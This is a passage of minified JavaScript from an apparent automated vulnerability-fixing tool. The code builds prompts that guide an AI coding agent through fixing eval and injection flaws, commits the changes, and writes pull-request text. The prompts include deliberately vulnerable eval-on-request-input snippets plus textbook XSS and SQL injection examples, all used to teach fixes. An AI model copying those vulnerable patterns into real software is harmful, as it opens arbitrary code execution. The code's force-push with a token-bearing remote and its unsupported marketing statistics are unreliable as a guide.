- **Complexity**: ${J.complexity}
- **Files with vulnerabilities**: ${J.relatedFiles?.join(", ")||"To be discovered"}

## Your Task:

### Phase 1: Locate Vulnerabilities & Check Tests
- Use Grep to find vulnerable code patterns
- Use Read to understand the full context
- Search for existing tests that exercise the vulnerable code
- Identify how the vulnerable code is used (callbacks, promises, etc.)
- Consider using sequential thinking for complex vulnerability analysis

### Phase 2: Red-Green-Refactor Validation
**CRITICAL**: Before fixing, validate the vulnerability exists:
- If tests exist: Run them to establish baseline
- Create or identify a test that demonstrates the vulnerability
- Ensure this test would FAIL on vulnerable code (RED phase)
- Document what malicious input would exploit the vulnerability

### Phase 3: Fix Vulnerabilities In-Place with Compatibility

**\uD83D\uDEA8 CRITICAL REQUIREMENT - YOU MUST FOLLOW THIS EXACT ORDER:**

#### Step 3.1: EDIT FILES FIRST (MANDATORY)
**YOU MUST use the Edit or MultiEdit tools to modify files BEFORE providing JSON.**
- ❌ DO NOT skip to JSON without editing files first
- ❌ DO NOT provide file contents in JSON instead of editing
- ✅ DO use Edit/MultiEdit tools to make actual file changes
- ✅ DO wait for "File updated successfully" confirmation
- ✅ DO make minimal, surgical changes to fix security issues

#### Step 3.2: Preserve Compatibility (WHILE EDITING)
- **PRESERVE API COMPATIBILITY**: 
  - If code uses callbacks, maintain callback interface
  - If changing from callbacks to async/await, add compatibility wrapper
  - Never break existing function signatures
- Maintain existing code style and formatting
- Fix all instances of the vulnerability

#### Step 3.3: Verify Edits Were Applied
**After using Edit/MultiEdit, confirm the files were modified:**
- You should see "File [path] has been updated" messages
- If you don't see these confirmations, the edits didn't work
- Try again with the Edit tool until you see confirmations

Example compatibility wrapper for callback to async conversion:
\`\`\`javascript
// Original method for compatibility
methodName(param1, param2, callback) {
  if (typeof callback === 'function') {
    // Callback style
    this.methodNameAsync(param1, param2)
      .then(result => callback(null, result))
      .catch(error => callback(error));
  } else {
    // Promise style
    return this.methodNameAsync(param1, param2);
  }
}

// New async implementation
async methodNameAsync(param1, param2) {
  // Secure implementation here
}
\`\`\`

### Phase 4: Verify Your Changes (GREEN phase)
- Use Read to verify your edits were applied correctly
- Ensure the code still makes sense and will function properly
- Verify the test that demonstrated the vulnerability now PASSES
- Check that legitimate use cases still work
- Ensure no breaking changes to public APIs

### Phase 5: Provide Fix Summary (ONLY AFTER EDITING FILES)

**⚠️ PREREQUISITE: You MUST have already edited files with Edit/MultiEdit tools BEFORE this phase**

After you have:
1. ✅ Used Edit/MultiEdit tools to modify files
2. ✅ Seen "File updated successfully" confirmations
3. ✅ Verified your changes were applied

THEN AND ONLY THEN provide a summary in this EXACT JSON format:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it. Include the vulnerability type, severity, and impact.",
  "files": [
    {
      "path": "path/to/file.js",
      "changes": "Complete content of the fixed file after all edits have been applied (read it back with Read tool if needed)"
    }
  ],
  "tests": [
    "Description of test 1 that validates the fix",
    "Description of test 2 that ensures no regressions",
    "Description of test 3 that verifies security improvement"
  ]
}
\`\`\`

**VALIDATION CHECKLIST:**
- [ ] Did you use Edit/MultiEdit tools FIRST? (Required)
- [ ] Did you see "File updated successfully" messages? (Required)
- [ ] Are you providing the JSON AFTER editing? (Required)
- [ ] Does "changes" contain the COMPLETE file content? (Required)

**If any checkbox is unchecked, GO BACK and complete the editing phase first!**

## \uD83D\uDD34 CRITICAL - EXECUTION ORDER IS MANDATORY \uD83D\uDD34

**YOU MUST FOLLOW THIS EXACT SEQUENCE:**

1. **FIRST**: Use Edit/MultiEdit tools to modify the vulnerable files
   - You MUST see "File updated successfully" messages
   - If you don't see these, the edit didn't work - try again

2. **SECOND**: Read the files back to verify your changes were applied
   - Use the Read tool to confirm the vulnerability is fixed

3. **THIRD**: Only after steps 1 and 2, provide the JSON summary
   - Include the complete fixed file content in the "changes" field

**❌ COMMON MISTAKES TO AVOID:**
- Skipping straight to JSON without editing files
- Putting file edits in JSON instead of using Edit tools
- Not waiting for edit confirmation before proceeding

**✅ CORRECT BEHAVIOR:**
- Edit files → See confirmation → Read to verify → Then provide JSON

Remember: The git-based approach requires ACTUAL file modifications via Edit tools, not just JSON descriptions!
3. **Make minimal changes** - Only fix the security issue
4. **Preserve functionality** - The code must still work correctly
5. **Maintain compatibility** - NEVER break existing APIs or interfaces
6. **Validate the fix** - Demonstrate vulnerability exists and is fixed
7. **Fix all instances** - Don't leave any vulnerabilities unfixed
8. **Use relative paths** - Use paths like 'app/data/file.js' not '/app/data/file.js'

Your changes will be committed to git, so make them production-ready!`}constructStructuredPhasedPrompt(X,J){return`You are an expert security engineer fixing vulnerabilities. You MUST complete this task in TWO distinct phases:

## \uD83D\uDEA8 CRITICAL: FOLLOW THESE PHASES IN ORDER \uD83D\uDEA8

## PHASE 1: FILE EDITING (MANDATORY - DO THIS FIRST)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

### Your Task:
1. Locate the vulnerability: ${X.title}
   - Description: ${X.body}
   - Related files: ${J.relatedFiles?.join(", ")||"To be discovered"}

2. Use Edit or MultiEdit tools to fix the vulnerable code
   - Make minimal, surgical changes
   - Preserve API compatibility
   - Fix all instances of the vulnerability

3. After editing, use Read tool to verify your changes were applied

4. Say "PHASE 1 COMPLETE: Files have been edited" when done

⚠️ IMPORTANT: You MUST complete Phase 1 before proceeding to Phase 2.
Do NOT skip directly to providing JSON.

## PHASE 2: JSON SUMMARY (ONLY AFTER PHASE 1)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Only after you've confirmed "PHASE 1 COMPLETE", provide the JSON summary:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it",
  "files": [
    {
      "path": "path/to/edited/file.js",
      "changes": "Complete file content after your edits (read it back with Read tool if needed)"
    }
  ],
  "tests": [
    "Description of test that validates the fix",
    "Description of test that ensures no regressions"
  ]
}
\`\`\`

## Execution Checklist:
□ Used Edit/MultiEdit tools
□ Verified changes with Read tool  
□ Stated "PHASE 1 COMPLETE"
□ Provided JSON summary

Remember: Edit files FIRST, then provide JSON. Do not provide JSON without editing.`}getSpecificVulnerabilityDetails(X){if(U.info("[DEBUG] getSpecificVulnerabilityDetails called"),U.info("[DEBUG] issueContext keys:",Object.keys(X||{})),U.info("[DEBUG] specificVulnerabilities present:",!!X.specificVulnerabilities),U.info("[DEBUG] specificVulnerabilities length:",X.specificVulnerabilities?.length||0),X.specificVulnerabilities&&X.specificVulnerabilities.length>0)U.info("[DEBUG] First vulnerability:",JSON.stringify(X.specificVulnerabilities[0],null,2));if(!X.specificVulnerabilities||X.specificVulnerabilities.length===0)return U.warn("[DEBUG] No specific vulnerabilities found in issue context"),"";let J=`
## SPECIFIC VULNERABILITIES TO FIX
`;J+=`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`,J+=`⚠️ You MUST fix ONLY these specific issues:

`;let Q={};return X.specificVulnerabilities.forEach((Y)=>{let W=Y.file||Y.path||"unknown";if(!Q[W])Q[W]=[];Q[W].push(Y)}),U.info("[DEBUG] Vulnerabilities grouped by file:",Object.keys(Q)),Object.entries(Q).forEach(([Y,W])=>{J+=`### File: ${Y}
`,W.forEach((G)=>{if(J+=`- **Line ${G.line}**: ${G.message||G.description}
`,G.snippet||G.code)J+=`  Code: \`${G.snippet||G.code}\`
`;if(G.remediation)J+=`  Fix: ${G.remediation}
`}),J+=`
`}),J+=`❌ DO NOT fix issues in other files
`,J+=`❌ DO NOT modify vendor/third-party libraries
`,J+=`❌ Focus ONLY on the vulnerabilities listed above

`,U.info("[DEBUG] Generated vulnerability details section length:",J.length),J}getVulnerabilitySpecificGuidance(X){let J=X.title.toLowerCase(),Q=X.body.toLowerCase(),Y="";if(J.includes("insecure_deserialization")||J.includes("eval")||J.includes("ssjs")||J.includes("injection")||Q.includes("eval(")||Q.includes("deserializing"))Y+=`
## \uD83D\uDEA8 EVAL/DESERIALIZATION FIX GUIDANCE \uD83D\uDEA8
`,Y+=`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`,Y+="**CRITICAL**: This vulnerability uses `eval()` which executes arbitrary code.\n",Y+=`The eval() function MUST be completely removed and replaced.

`,Y+=`### STEP-BY-STEP FIX INSTRUCTIONS:

`,Y+=`1. **LOCATE the eval() calls**:
`,Y+="   - Use Grep to find all instances of `eval(`\n",Y+=`   - Common locations: data parsing, calculation functions, user input handling

`,Y+=`2. **IDENTIFY what data type is expected**:
`,Y+=`   - Number (integer or decimal)? → Use parseInt() or parseFloat()
`,Y+=`   - JSON object? → Use JSON.parse()
`,Y+=`   - Mathematical expression? → Use a safe math library
`,Y+=`   - **Check for commented-out fixes in the code!**

`,Y+=`3. **REPLACE eval() using Edit tool**:

`,Y+=`✅ **FOR NUMBERS (most common)**:
`,Y+="```javascript\n",Y+=`// BEFORE (VULNERABLE):
`,Y+=`const preTax = eval(req.body.preTax);
`,Y+=`const afterTax = eval(req.body.afterTax);
`,Y+=`const roth = eval(req.body.roth);

`,Y+=`// AFTER (FIXED):
`,Y+=`const preTax = parseInt(req.body.preTax, 10);
`,Y+=`const afterTax = parseInt(req.body.afterTax, 10);
`,Y+=`const roth = parseInt(req.body.roth, 10);
`,Y+="```\n\n",Y+=`✅ **FOR DECIMAL NUMBERS**:
`,Y+="```javascript\n",Y+=`// BEFORE: const price = eval(userInput);
`,Y+=`// AFTER:  const price = parseFloat(userInput);
`,Y+="```\n\n",Y+=`✅ **FOR JSON DATA**:
`,Y+="```javascript\n",Y+=`// BEFORE: const data = eval("(" + userInput + ")");
`,Y+=`// AFTER:  const data = JSON.parse(userInput);
`,Y+="```\n\n",Y+=`❌ **THESE DO NOT FIX THE VULNERABILITY**:
`,Y+=`- Input validation before eval() (still executes code)
`,Y+=`- Sanitizing or escaping input (can be bypassed)
`,Y+=`- Using new Function() (also executes arbitrary code)
`,Y+=`- Wrapping eval() in try-catch (still allows code execution)

`,Y+=`4. **VERIFY the fix**:
`,Y+=`   - Use Read tool to confirm eval() is completely removed
`,Y+=`   - Ensure ALL instances are replaced
`,Y+=`   - Run the RED tests - they should PASS after fix

`,Y+=`### EXAMPLE COMPLETE FIX:

`,Y+=`If you see code like this:
`,Y+="```javascript\n",Y+=`const preTax = eval(req.body.preTax);    // Line 32
`,Y+=`const afterTax = eval(req.body.afterTax);  // Line 33
`,Y+=`const roth = eval(req.body.roth);      // Line 34
`,Y+="```\n\n",Y+=`Use the Edit tool to replace it with:
`,Y+="```javascript\n",Y+=`const preTax = parseInt(req.body.preTax, 10);    // Line 32
`,Y+=`const afterTax = parseInt(req.body.afterTax, 10);  // Line 33
`,Y+=`const roth = parseInt(req.body.roth, 10);      // Line 34
`,Y+="```\n\n",Y+=`**IMPORTANT NOTES**:
`,Y+=`- parseInt() safely converts strings to integers
`,Y+=`- The second parameter (10) specifies base-10 numbers
`,Y+=`- This completely prevents code execution
`,Y+=`- Maintains the same API - no breaking changes
`,Y+=`- Invalid input returns NaN (handled by existing validation)

`;return Y}async constructPromptWithTestContext(X,J,Q,Y,W){U.info("[DEBUG] constructPromptWithTestContext called"),U.info("[DEBUG] Issue context:",{hasTitle:!!X.title,hasBody:!!X.body,hasSpecificVulnerabilities:!!X.specificVulnerabilities,vulnerabilityCount:X.specificVulnerabilities?.length||0});let G=`You are an expert security engineer fixing vulnerabilities.

## \uD83D\uDEA8 CRITICAL CONSTRAINTS - READ FIRST \uD83D\uDEA8
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. **NEVER MODIFY TEST FILES** - You must NEVER edit files in test/, spec/, or __tests__ directories
2. **NEVER BYPASS TESTS** - Do not change test code to make tests pass
3. **ONLY FIX IMPLEMENTATION** - Only modify the actual vulnerable code files
4. **If a test fails, fix the IMPLEMENTATION, not the test**
5. **Test files are READ-ONLY** - You may read them to understand requirements
6. **DO NOT modify vendor/third-party libraries** unless the vulnerability is specifically there

${this.getSpecificVulnerabilityDetails(X)}

## TEST EXECUTION CAPABILITY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

You can run tests to verify your fix works:

\`\`\`bash
# Run all tests
npm test

# Run specific test file
npm test -- path/to/test.js

# Check if your changes fixed the vulnerability
npm test -- --grep "security"
\`\`\`

**IMPORTANT**:
- Use the Bash tool to run tests
- If tests fail, read the error output
- Adjust your fix based on test feedback
- You have 3 attempts to get tests passing
- DO NOT modify the tests to make them pass

${this.getVulnerabilitySpecificGuidance(X)}

`;try{let H=await this.testAwareEnhancement.enhanceContext(X,J,this.repoPath,{enabled:!0,vulnerableFilePath:J.relatedFiles?.[0],testDiscoveryRoot:this.repoPath,discoveryTimeout:30000,includeTestContent:!0,verbose:process.env.RSOLV_DEBUG_CONVERSATION==="true"});if(H){let z=this.testAwareEnhancement.generatePromptEnhancement(H);G+=z,U.info("[TestAware] Successfully added test-aware context to prompt")}else U.info("[TestAware] No test-aware context available, continuing without enhancement")}catch(H){U.warn("[TestAware] Failed to enhance prompt with test awareness:",H)}if(G+=this.constructPrompt(X,J),Q?.generatedTests?.success)G+=`

## Generated Tests
`,G+=`The following tests have been generated to validate your fix:

`,Q.generatedTests.tests.forEach((H)=>{G+=`### ${H.framework} Test
`,G+="```"+(H.framework==="rspec"?"ruby":"javascript")+`
`,G+=H.testCode,G+="\n```\n\n"}),G+=`**IMPORTANT**: Your fix must make these tests pass!
`,G+=`- RED test should fail before your fix
`,G+=`- GREEN test should pass after your fix
`,G+=`- REFACTOR test should ensure functionality is maintained
`;if(Y&&!Y.success){if(G+=`

## Previous Fix Attempt Failed
`,G+=`This is attempt ${W?.current||2} of ${W?.max||3}.

`,G+=`### Test Results:
`,G+="```\n",G+=`Vulnerable commit - RED tests: ${Y.vulnerableCommit.allPassed?"PASSED (unexpected!)":"FAILED (expected)"}
`,G+=`Fixed commit - RED tests: ${Y.fixedCommit.allPassed?"PASSED (expected)":"FAILED (problem!)"}
`,Y.fixedCommit.redTestsPassed&&Y.fixedCommit.redTestsPassed.length>1)G+=`
Individual RED test results on fixed code:
`,Y.fixedCommit.redTestsPassed.forEach((H,z)=>{G+=`  - RED test ${z+1}: ${H?"PASSED":"FAILED"}
`});if(G+="\n```\n\n",!Y.fixedCommit.allPassed)G+=`- **The vulnerability still exists** - RED tests are still failing on your fixed code
`,G+=`- This means your fix did not properly address the security issue
`;if(Y.vulnerableCommit.allPassed)G+=`- **Warning**: RED tests passed on vulnerable code (they should fail!)
`,G+=`- This suggests the tests may not be properly detecting the vulnerability
`;G+=`
**Please analyze the test failures and try a different approach.**
`,G+=`Consider:
`,G+=`- Are you handling all edge cases?
`,G+=`- Is the fix too restrictive or breaking functionality?
`,G+=`- Do you need to adjust the implementation strategy?
`,G+=`- Review the RED test expectations and attack vectors
`}if(W){if(G+=`

## Iteration Context
`,G+=`You have ${W.max-W.current} attempts remaining.
`,W.current===W.max)G+=`**This is your final attempt.** Ensure the fix is comprehensive.
`}return G+=`

## Test Validation Instructions
`,G+=`1. After implementing your fix, explain how to run the tests
`,G+=`2. Specify which test framework is being used
`,G+="3. Include the test command (e.g., `bundle exec rspec` or `npm test`)\n",G+=`4. Ensure all security tests pass before considering the fix complete
`,G}parsePhaseCompletion(X=[]){let J=!1,Q=!1,Y=!1;for(let W of X){if(W.type==="text"&&W.text){if(W.text.includes("PHASE 1 COMPLETE"))J=!0;if(W.text.includes("```json"))Y=!0}if(W.type==="assistant"&&W.message?.content){for(let G of W.message.content)if(G.type==="text"&&G.text){if(G.text.includes("PHASE 1 COMPLETE"))J=!0;if(G.text.includes("```json"))Y=!0}}if(W.type==="tool_use"){if(W.name==="Edit"||W.name==="MultiEdit")Q=!0}if(W.type==="assistant"&&W.message?.content){for(let G of W.message.content)if(G.type==="tool_use"){if(G.name==="Edit"||G.name==="MultiEdit")Q=!0}}}return{phase1Complete:J,filesEdited:Q,jsonProvided:Y,success:J&&Q&&Y}}async generateSolutionWithGit(X,J,Q,Y,W,G){let H=Date.now();try{let z=this.getModifiedFiles();if(z.length>0)U.warn(`Repository has uncommitted changes: ${z.join(", ")}`);U.info("Executing Claude Code to fix vulnerabilities in-place..."),U.info("[DEBUG] About to construct prompt:",{hasTestResults:!!Y,hasValidationResult:!!W,hasIteration:!!G,issueContextKeys:Object.keys(X),hasSpecificVulnerabilities:!!X.specificVulnerabilities});let $=Y||W||G?await this.constructPromptWithTestContext(X,J,Y,W,G):Q;if($){if(U.info("[DEBUG] Prompt includes SPECIFIC VULNERABILITIES:",$.includes("SPECIFIC VULNERABILITIES TO FIX")),$.includes("SPECIFIC VULNERABILITIES TO FIX")){let O=$.indexOf("SPECIFIC VULNERABILITIES TO FIX"),R=Math.min(O+1000,$.length);U.info("[DEBUG] Vulnerability section:",$.substring(O,R))}}U.info("Using Claude Code CLI adapter for file editing...");let V=await this.cliAdapter.generateSolution(X,J,$);if(process.env.RSOLV_DEBUG_CONVERSATION==="true"){if(U.warn("⚠️  DEBUG MODE: Conversation logging enabled - DO NOT USE IN PRODUCTION"),V.messages)U.info("=== CLAUDE CODE CONVERSATION START ==="),V.messages.forEach((O,R)=>{if(U.info(`Message ${R+1} (${O.type}):`),O.type==="text"&&O.text){let I=O.text.length>500?O.text.substring(0,500)+"...[truncated]":O.text;U.info(`  Text: ${I}`)}else if(O.type==="tool_use"){if(U.info(`  Tool: ${O.name}`),O.input?.path||O.input?.file_path)U.info(`  File: ${O.input.path||O.input.file_path}`);if(O.input?.old_string)U.info(`  Editing: ${O.input.old_string.substring(0,100)}...`)}else if(O.type==="assistant"&&O.message?.content)U.info(`  Assistant message with ${O.message.content.length} content items`)}),U.info("=== CLAUDE CODE CONVERSATION END ===")}if(!V.success)return{success:!1,message:V.message,error:V.error};let K=this.getModifiedFiles();if(process.env.RSOLV_DEBUG_CONVERSATION==="true")try{let O=s9("git status --porcelain",{cwd:this.repoPath,encoding:"utf8"});U.info(`Git status output: ${O||"(no changes)"}`);let R=s9("pwd",{cwd:this.repoPath,encoding:"utf8"}).trim();U.info(`Working directory: ${R}`);let I=s9("ls -la",{cwd:this.repoPath,encoding:"utf8"});U.info(`Files in directory:
${I}`)}catch(O){U.error("Failed to get git debug info:",O)}if(K.length===0)return{success:!1,message:"No files were modified",error:"Claude Code did not make any file changes. The vulnerability may not exist or could not be located."};U.info(`Files modified by Claude Code: ${K.join(", ")}`);let Z=this.getDiffStats(),q;if(V.changes){if(V.changes.summary)try{q=JSON.parse(V.changes.summary)}catch(O){U.warn("Failed to parse summary JSON",O)}if(!q&&Object.keys(V.changes).length>0){let O=Object.values(V.changes)[0];if(typeof O==="string"&&O.includes("{"))try{q=JSON.parse(O)}catch(R){q={title:`Fix security vulnerability in ${K[0]}`,description:O}}}}let B=this.createCommitMessage(q?.title||`Fix security vulnerability in ${X.title}`,q?.description||V.message||"Applied security fixes",X.number),M=this.createCommit(K,B);return{success:!0,message:`Successfully fixed vulnerabilities in ${K.length} file(s)`,filesModified:K,commitHash:M,diffStats:Z,summary:q?{title:q.title,description:q.description,securityImpact:q.securityImpact||"Vulnerabilities have been patched",tests:q.testingGuidance||q.tests||[]}:{title:`Fix security vulnerability: ${X.title}`,description:V.message||"Security vulnerabilities fixed",securityImpact:"Vulnerabilities have been patched",tests:[]}}}catch(z){return U.error("Git-based solution generation failed",z),{success:!1,message:"Failed to generate solution",error:`Git-based solution generation failed: ${z instanceof Error?z.message:String(z)}`}}}getModifiedFiles(){try{let X=s9("git diff --name-only",{cwd:this.repoPath,encoding:"utf-8"}).trim();return X?X.split(`
`):[]}catch(X){return U.error("Failed to get modified files",X),[]}}getDiffStats(){try{let J=s9("git diff --stat",{cwd:this.repoPath,encoding:"utf-8"}).match(/(\d+) files? changed(?:, (\d+) insertions?\(\+\))?(?:, (\d+) deletions?\(-\))?/);if(J)return{filesChanged:parseInt(J[1],10),insertions:parseInt(J[2]||"0",10),deletions:parseInt(J[3]||"0",10)};return{filesChanged:0,insertions:0,deletions:0}}catch(X){return U.error("Failed to get diff stats",X),{filesChanged:0,insertions:0,deletions:0}}}createCommit(X,J){try{try{s9("git config user.email",{cwd:this.repoPath})}catch{s9('git config user.email "rsolv@users.noreply.github.com"',{cwd:this.repoPath}),s9('git config user.name "RSOLV Bot"',{cwd:this.repoPath})}s9(`git add ${X.join(" ")}`,{cwd:this.repoPath});let Q=Q0("fs"),Y=Q0("os"),G=Q0("path").join(Y.tmpdir(),`commit-msg-${Date.now()}.txt`);Q.writeFileSync(G,J);try{s9(`git commit -F "${G}"`,{cwd:this.repoPath})}finally{try{Q.unlinkSync(G)}catch{}}let H=s9("git rev-parse HEAD",{cwd:this.repoPath,encoding:"utf-8"}).trim();return U.info(`Created commit ${H.substring(0,8)}: ${J.split(`
`)[0]}`),H}catch(Q){throw U.error("Failed to create commit",Q),Q}}createCommitMessage(X,J,Q){return`${X}

${J}

Fixes #${Q}

This commit was automatically generated by RSOLV to fix security vulnerabilities.`}}var zQ=s(()=>{h3();I1();CA()});import{execSync as OX}from"child_process";async function VQ(X,J,Q,Y,W){try{U.info(`Creating educational PR from commit ${J.substring(0,8)} for issue #${X.number}`);try{OX("git config user.email",{cwd:process.cwd()})}catch{U.info("Configuring git user for GitHub Actions"),OX('git config user.email "rsolv@users.noreply.github.com"',{cwd:process.cwd()}),OX('git config user.name "RSOLV Bot"',{cwd:process.cwd()})}let G=`rsolv/fix-issue-${X.number}`;try{OX(`git checkout -b ${G}`,{cwd:process.cwd()}),U.info(`Created branch: ${G}`)}catch(q){OX(`git checkout ${G}`,{cwd:process.cwd()}),U.info(`Switched to existing branch: ${G}`)}let H=process.env.GITHUB_TOKEN||process.env.GH_PAT;if(H&&process.env.GITHUB_REPOSITORY){let[q,B]=process.env.GITHUB_REPOSITORY.split("/"),M=`https://x-access-token:${H}@github.com/${q}/${B}.git`;try{OX(`git remote set-url origin ${M}`,{cwd:process.cwd()}),U.debug("Configured git authentication for push")}catch(O){U.debug("Could not configure authenticated remote")}}try{OX(`git push -u origin ${G}`,{cwd:process.cwd()}),U.info(`Pushed branch: ${G}`)}catch(q){let B=q.message||String(q);if(B.includes("Updates were rejected")||B.includes("already exists")||B.includes("non-fast-forward")){U.info("Branch exists on remote, attempting force push");try{OX(`git push -f origin ${G}`,{cwd:process.cwd()}),U.info(`Force pushed branch: ${G}`)}catch(M){throw U.error("Force push also failed",M),M}}else throw U.error("Failed to push branch",{error:B,branch:G}),q}let z=$x1(Q,X),$=Vx1(X,Q,z,W),V=Z0(),[K,Z]=X.repository.fullName.split("/");try{let q=Q.isTestMode&&Q.validationFailed?"[TEST MODE] ":"",{data:B}=await V.pulls.create({owner:K,repo:Z,title:`${q}[RSOLV] ${Q.title} (fixes #${X.number})`,body:$,head:G,base:X.repository.defaultBranch||"main",maintainer_can_modify:!0});if(U.info(`Created educational pull request #${B.number}: ${B.html_url}`),Y.rsolvApiKey)try{await new x6(Y.rsolvApiKey).createFixAttempt({issueId:X.id,issueNumber:X.number,repository:X.repository.fullName,pullRequestUrl:B.html_url,pullRequestNumber:B.number,branchName:G,commitHash:J,metadata:{hasEducationalContent:!0,vulnerabilityType:Q.vulnerabilityType,severity:Q.severity}}),U.info("Tracked educational fix in RSOLV API")}catch(M){U.warn("Failed to track in RSOLV API",M)}return{success:!0,message:`Created educational pull request #${B.number}`,pullRequestUrl:B.html_url,pullRequestNumber:B.number,branchName:G,commitHash:J,educationalContent:z}}catch(q){if(q.status===422&&q.message?.includes("pull request already exists")){U.warn("Pull request already exists for this branch");let{data:B}=await V.pulls.list({owner:K,repo:Z,head:`${K}:${G}`,state:"open"});if(B.length>0){let M=B[0];return{success:!0,message:`Pull request already exists: #${M.number}`,pullRequestUrl:M.html_url,pullRequestNumber:M.number,branchName:G,commitHash:J,educationalContent:z}}}throw q}}catch(G){return U.error("Failed to create educational pull request",G),{success:!1,message:"Failed to create pull request",error:G instanceof Error?G.message:String(G)}}}function $x1(X,J){let Q=[],Y=X.vulnerabilityType?.toUpperCase()||"SECURITY",W=$Q[Y]||$Q.XSS;if(Q.push(`## What is ${W.title}?`),Q.push(W.description),Q.push(""),Q.push("## How this fix prevents the vulnerability:"),Q.push(W.prevention),W.example)Q.push(""),Q.push("**Example:**"),Q.push(W.example);if(Q.push(""),Q.push("## Best practices:"),Q.push("- Always validate and sanitize user input"),Q.push("- Apply the principle of least privilege"),Q.push("- Keep dependencies updated"),Q.push("- Implement security headers"),Q.push("- Use security linters and scanners in CI/CD"),X.isAiGenerated||Y==="SLOPSQUATTING")Q.push(""),Q.push("## \uD83E\uDD16 AI-Specific Vulnerability Context"),Q.push("This vulnerability is related to AI-generated code. Our research shows:"),Q.push("- 19.6% of AI package suggestions are hallucinated (non-existent)"),Q.push("- Attackers actively exploit these by registering malicious packages"),Q.push("- Always verify package existence before adding dependencies");return Q.push(""),Q.push("## About RSOLV"),Q.push("RSOLV automatically fixes security vulnerabilities, not just detects them."),Q.push("- 181 patterns across 8 languages and frameworks"),Q.push("- Success-based pricing: only pay for deployed fixes"),Q.push("- Detects AI-specific vulnerabilities others miss"),Q.push("- AST-based analysis for minimal false positives"),Q.join(`
`)}function Vx1(X,J,Q,Y){let W=[],G=J.isTestMode&&J.validationFailed?"[TEST MODE] ":"";if(W.push(`# ${G}${J.title}`),W.push(""),J.isTestMode&&J.validationFailed){if(W.push("> ⚠️ **TEST MODE**: This PR was created despite validation failures to allow inspection of the attempted fix."),W.push("> "),J.testModeNote)W.push(`> **Validation Issue:** ${J.testModeNote}`);W.push(""),W.push("---"),W.push("")}if(W.push(`**Fixes:** #${X.number}`),W.push(`**Severity:** ${J.severity||"Medium"}`),J.cwe)W.push(`**CWE:** ${J.cwe}`);if(W.push(""),W.push("## \uD83D\uDCDD Summary"),W.push(J.description),W.push(""),Y&&Y.filesChanged>0)W.push("## \uD83D\uDCCA Changes Made"),W.push(`- **Files Changed:** ${Y.filesChanged}`),W.push(`- **Lines Added:** +${Y.insertions}`),W.push(`- **Lines Removed:** -${Y.deletions}`),W.push("");W.push("## \uD83D\uDCDA Understanding This Fix"),W.push("");let H=J.vulnerabilityType?.toUpperCase()||"SECURITY",z=$Q[H]||$Q.XSS;if(W.push(`### \uD83D\uDEE1️ What is ${z.title}?`),W.push(z.description),W.push(""),W.push("### \uD83D\uDD27 How This Fix Works"),W.push(z.prevention),z.example)W.push(""),W.push("**Example:**"),W.push("```"),W.push(z.example),W.push("```");if(W.push(""),W.push("### ✅ Best Practices"),W.push("1. Always validate and sanitize user input"),W.push("2. Apply the principle of least privilege"),W.push("3. Keep dependencies updated"),W.push("4. Implement security headers"),W.push("5. Use security linters and scanners in CI/CD"),W.push(""),J.tests&&J.tests.length>0)W.push("## \uD83E\uDDEA Testing Instructions"),J.tests.forEach(($,V)=>{W.push(`${V+1}. ${$}`)}),W.push("");return W.push("## ✔️ Review Checklist"),W.push("- [ ] Changes fix the reported vulnerability"),W.push("- [ ] No new vulnerabilities introduced"),W.push("- [ ] Existing functionality preserved"),W.push("- [ ] Code follows project conventions"),W.push("- [ ] Tests pass (if applicable)"),W.push(""),W.push("## \uD83E\uDD16 About RSOLV"),W.push(""),W.push("[RSOLV](https://rsolv.dev) automatically fixes security vulnerabilities in your code."),W.push(""),W.push("**What makes RSOLV different:**"),W.push("- \uD83D\uDD27 **Fixes, not just reports:** We generate working code, not just vulnerability lists"),W.push("- \uD83D\uDCB0 **Success-based pricing:** Only pay for fixes that get deployed"),W.push("- \uD83E\uDD16 **AI-aware security:** Detect vulnerabilities specific to AI-generated code"),W.push("- \uD83C\uDFAF **181+ patterns:** Comprehensive coverage across 8 languages and frameworks"),W.push("- \uD83C\uDF33 **AST-based analysis:** Minimal false positives through syntax tree parsing"),W.push(""),W.push("---"),W.push(""),W.push("*This PR was automatically generated by [RSOLV](https://rsolv.dev) using direct file editing.*"),W.push(`*Learn more about ${z.title} on [OWASP](https://owasp.org)*`),W.join(`
`)}var $Q;var ZG=s(()=>{I1();z9();$Q={XSS:{title:"Cross-Site Scripting (XSS)",description:"XSS allows attackers to inject malicious scripts into web pages viewed by other users. This can lead to session hijacking, defacement, or redirection to malicious sites.",prevention:"Always sanitize user input, use Content Security Policy (CSP), encode output, and validate input on both client and server sides.",example:'`<script>alert("XSS")</script>` becomes `&lt;script&gt;alert("XSS")&lt;/script&gt;`'},SQLi:{title:"SQL Injection",description:"SQL injection allows attackers to interfere with database queries, potentially reading sensitive data, modifying database data, or executing administrative operations.",prevention:"Use parameterized queries/prepared statements, validate input types, apply least privilege principle to database accounts, and avoid dynamic SQL construction.",example:'Instead of `query("SELECT * FROM users WHERE id = " + userId)`, use parameterized: `query("SELECT * FROM users WHERE id = ?", [userId])`'},slopsquatting:{title:"Slopsquatting (AI-Specific Vulnerability)",description:"Slopsquatting exploits AI code generation tools that hallucinate non-existent package names. Attackers register these packages to inject malicious code. Our research shows 19.6% of AI package suggestions are hallucinated.",prevention:"Always verify package existence before adding dependencies, use package registries with verification, and implement dependency scanning in CI/CD pipelines.",example:'AI might suggest `import { validateInput } from "secure-validator"` where "secure-validator" doesn\'t exist, allowing attackers to register it.'},CSRF:{title:"Cross-Site Request Forgery (CSRF)",description:"CSRF tricks authenticated users into executing unwanted actions. An attacker can force users to perform state-changing requests like transferring funds or changing email addresses.",prevention:"Implement anti-CSRF tokens, use SameSite cookie attribute, verify Origin/Referer headers, and require re-authentication for sensitive actions."},XXE:{title:"XML External Entity (XXE) Injection",description:"XXE attacks exploit vulnerabilities in XML parsers to access local or remote files, perform SSRF attacks, or cause denial of 